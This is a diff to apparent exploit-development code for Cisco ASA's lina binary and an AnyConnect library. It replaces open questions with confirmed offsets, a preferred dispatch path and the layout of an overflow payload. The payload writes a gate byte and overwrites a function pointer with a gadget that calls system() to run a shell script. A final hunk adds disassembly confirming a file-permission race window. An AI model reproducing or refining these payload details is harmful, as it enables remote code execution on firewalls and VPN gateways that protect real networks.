@@ -2944,7 +2944,9 @@ class CiscoASALinaRE:
 #   Call at 0x1f57a4e: call *0x398(%rbx)
 #   PREREQUISITE: ASA clustering must be configured (ngfw_3ru_cluster_enabled sets 0x708e5c4=1
 #                 at 0x15850f9/0x15853d9; this is non-default on single-appliance ASAs).
-#   rdi at call site: -0x50(%rbp) — stack value from calling frame (TBD: control vector)
+#   rdi at call site (0x1f57a4e): [rbp-0x50] = second_arg + gp_obj->field_0x46c (uint16).
+#   field_0x46c is at gp_obj+0x46c — beyond overflow reach from +0x2b1 (cap +0x3b1). NOT attacker-controlled.
+#   PREFERRED PATH 0x1d344d0 (no cluster gate): mov rdi,rbx at 0x1d344cd — rdi = gp_obj. CONTROLLABLE.
 #   Overflow sequence: write 0x14 at gp_obj+0x33c (delta 0x8b), then fn_ptr at gp_obj+0x398 (delta 0xe7)
 #
 # SECONDARY VECTOR: gp_obj+0x308 corruption (limited utility — no direct fn_ptr dispatch)
@@ -3205,15 +3207,16 @@ class LinaF2ExploitPayload:
         (strcpy stops at first null). Fill with 0x41 ('A') up to gate byte.
         Gate byte 0x14 is non-null, so it propagates. Bytes 0x15..0xe6 filled 0x41.
 
-        rdi at call site (0x1f57a4e) = -0x50(%rbp), a stack value from calling frame.
-        Control of rdi via this vector is TBD — use execv or a gadget that ignores rdi
-        if rdi is not controllable, or chain via a pivot gadget.
-
-        Note: fn_ptr must not contain internal null bytes. system@plt=0xffac80 is clean.
+        rdi at call site (0x1f57a4e) = [rbp-0x50] = second_arg + gp_obj->field_0x46c.
+        field_0x46c is a uint16 at gp_obj+0x46c — beyond overflow reach (+0x2b1 origin,
+        max cap +0x3b1 = +0x100 from origin). NOT controllable via OU= overflow.
+        GADGET_RUN_CMD_SH bypasses this: uses system() with a fixed-string argument,
+        does not depend on rdi value from the calling frame.
+        PREFERRED PATH 0x1d344d0 (no cluster gate): rdi = rbx = gp_obj — CONTROLLABLE.
+        At 0x1d344cd: 'mov rdi, rbx; mov esi, 3; call *[rbx+0x398]'.
+        At preferred dispatch, called function receives gp_obj as rdi, esi=3.
         Recommended fn_ptr = GADGET_RUN_CMD_SH (0x3df9a30): system("/asa/scripts/run_cmd.sh &")
-        This bypasses the uncontrollable rdi problem by using a fixed-string gadget instead
-        of system@plt directly. The gadget is a mid-function lea+call snippet — stack frame
-        from our caller (return addr = 0x1f57a54) ensures return after system() completes.
+        or system@plt (0xffac80) — both ignore rdi; system() arg is embedded LEA operand.
         """
         gate_delta  = self.GP_OBJ_GATE_33C_DELTA    # 0x8b
         fnptr_delta = self.GP_OBJ_FN_PTR_398_DELTA  # 0xe7
@@ -4455,7 +4458,7 @@ LINA_SIGNEDNESS_CANDIDATES = [
         insn        = 'CALL recvfrom',
         callee      = 'recvfrom',
         param_type  = 'size_t len (4th arg, unsigned)',
-        source_type = 'MAX_RADIUS_PACKET constant — value TBD from binary',
+        source_type = 'edx=0x400 (1024 bytes) hardcoded immediate at 0x4304ad9; confirmed CALL recvfrom at 0x4304ae1',
         conversion  = (
             'Likely safe if constant is unsigned literal. Risk: if length check on '
             'returned ssize_t uses signed comparison (JS < 0 instead of US == -1), '
@@ -4541,7 +4544,7 @@ LINA_TOCTOU_SEQUENCES = [
         'name':        'SetTextFileContents -> chmod by name',
         'write_vaddr': 0xa22f7,
         'chmod_vaddr': 0xa232a,
-        'window_insns': 0xa232a - 0xa22f7,  # ~51 bytes; actual instruction count TBD
+        'window_insns': 20,  # confirmed: disasm 0xa22f7→0xa232a = 20 instructions
         'description': (
             'lina creates a file via SetTextFileContents (writes by filename), '
             'then calls chmod(filename, 0600). Between these two calls the file '
@@ -4564,6 +4567,38 @@ LINA_TOCTOU_SEQUENCES = [
         ),
         'status': 'CONFIRMED_PATTERN',
         'prereq': 'write access to parent directory or ability to register inotify watch',
+        'disasm_confirmation': {
+            'binary': 'libvpnagentutilities.so 5.1.15.287 (x86-64, 1,100,901 bytes)',
+            'window_instructions': [
+                '0xa22f7: call 0x24980  ; SysUtils::SetTextFileContents',
+                '0xa22fc: mov ebp, eax',
+                '0xa22fe: mov rdi, qword ptr [rsp + 8]',
+                '0xa2303: cmp rdi, r13',
+                '0xa2306: je 0xa230d',
+                '0xa2308: call 0x25710  ; operator delete (cleanup)',
+                '0xa230d: mov rdi, qword ptr [rsp + 0x28]',
+                '0xa2312: cmp rdi, rbx',
+                '0xa2315: je 0xa231c',
+                '0xa2317: call 0x25710  ; operator delete (cleanup)',
+                '0xa231c: test bpl, bpl',
+                '0xa231f: je 0xa2374',
+                '0xa2321: mov rdi, qword ptr [r14 + 0x68]  ; filename arg',
+                '0xa2325: mov esi, 0x180  ; mode = 0600 octal',
+                '0xa232a: call 0x25660  ; chmod(filename, 0600)',
+                '0xa232f: test eax, eax',
+                '0xa2331: je 0xa255f',
+                '0xa2337: call 0x246a0  ; __errno_location',
+                '0xa233c: mov edi, dword ptr [rax]',
+                '0xa233e: call 0x24bc0  ; strerror',
+            ],
+            'plt_resolution': {
+                '0x24980': 'SysUtils::SetTextFileContents (mangled: _ZN8SysUtils19SetTextFileContentsERKNSt...)',
+                '0x25710': 'operator delete (_ZdlPv)',
+                '0x25660': 'chmod',
+                '0x246a0': '__errno_location',
+                '0x24bc0': 'strerror',
+            },
+        },
     },
 ]
 
